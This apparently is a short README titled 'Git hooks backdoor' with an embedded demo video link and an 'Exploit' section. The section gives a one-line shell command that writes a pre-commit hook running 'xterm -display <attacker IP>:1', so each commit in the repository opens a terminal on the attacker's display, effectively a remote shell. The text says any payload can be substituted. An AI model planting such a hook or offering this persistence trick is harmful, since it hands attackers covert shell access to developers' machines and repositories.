Git hooks "backdoor"
======================

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=rCVmWUf8x1E" target="_blank"><img src="http://img.youtube.com/vi/rCVmWUf8x1E/0.jpg" alt="Profit with Git hooks!" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit

```

You can use whatever payload you want to exploit, using lame xterm to visually show off payload execution reversing a shell to attacker.

